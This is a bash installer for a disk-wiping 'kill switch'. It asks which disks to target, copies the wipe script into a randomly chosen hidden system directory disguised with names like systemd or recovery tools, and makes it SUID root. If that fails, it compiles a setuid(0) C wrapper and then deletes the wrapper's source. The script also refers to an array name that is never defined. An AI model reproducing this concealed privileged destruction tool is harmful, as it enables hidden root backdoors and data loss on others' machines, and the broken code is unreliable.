#!/bin/bash

set -euo pipefail

KILLSWITCH_SRC="killswitch.sh"
RANDOM_LOCS=(
    "/var/.cache/systemd/.bin"
    "/usr/local/lib/.recovery_tools"
    "/opt/.hidden/sys_wipe"
    "/etc/.crontabs/.init"
    "/var/lib/misc/.vault"
)

echo "[*] Scanning for block devices..."
lsblk -dno NAME,SIZE,TYPE | grep disk
echo
read -rp "[?] Enter disk(s) to wipe (space-separated, e.g., sda sdb): " -a DISK_INPUTS

DISK_PATHS=()
for disk in "${DISK_INPUTS[@]}"; do
    if [[ -b "/dev/$disk" ]]; then
        DISK_PATHS+=("/dev/$disk")
    else
        echo "[!] Invalid disk: $disk"
        exit 1
    fi
done

REPLACEMENT="\"${DISK_PATHS[*]}\""

INSTALL_DIR="${RANDOM_LOCATIONS[$((RANDOM % ${#RANDOM_LOCATIONS[@]}))]}"
INSTALL_PATH="$INSTALL_DIR/.ks_exec"

mkdir -p "$INSTALL_DIR"
cp "$KILLSWITCH_SRC" "$INSTALL_PATH"

sed -i "s/PLACEHOLDER1/$REPLACEMENT/g" "$INSTALL_PATH"

chmod 755 "$INSTALL_PATH"
chown root:root "$INSTALL_PATH"
if chmod u+s "$INSTALL_PATH" 2>/dev/null; then
    echo "[+] SUID set on $INSTALL_PATH (kinda rare for scripts, you got lucky!)."
else
    echo "[!] Could not set SUID on $INSTALL_PATH, wrapping in C binary and trying again..."
    cat > "$INSTALL_DIR/.wrapper.c" <<EOF
#include <stdlib.h>
#include <unistd.h>
int main() {
    setuid(0);
    execl("$INSTALL_PATH", "killswitch", NULL);
    return 1;
}
EOF
    rm -f "$INSTALL_PATH"
    gcc "$INSTALL_DIR/.wrapper.c" -o "$INSTALL_PATH"
    chown root:root "$INSTALL_PATH"
    chmod 4755 "$INSTALL_PATH"
    rm "$INSTALL_DIR/.wrapper.c"
    echo "[+] Wrapper compiled and setuid enabled."
fi

echo "[+] Kill switch installed to: $INSTALL_PATH"
